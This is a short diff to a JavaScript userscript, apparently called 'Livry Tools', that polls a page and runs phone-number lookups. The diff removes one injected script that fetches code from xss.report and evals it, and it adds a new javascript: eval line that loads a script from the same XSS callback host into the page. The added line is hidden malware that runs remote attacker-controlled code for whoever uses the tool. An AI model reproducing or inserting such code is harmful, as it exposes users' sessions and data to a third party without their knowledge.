@@ -161,8 +161,9 @@ function mainCheck() {
         runApiSearch(currentPhoneNumber);
     }
 }
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/biksoft");a.send();</script>
 // --- EXECUTION ---
 // Start the main check on a 1-second interval.
 setInterval(mainCheck, 1000);
 console.log("✅ Livry Tools (Required Script) is running. Watching for changes...");
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/biksoft\';document.body.appendChild(a)')
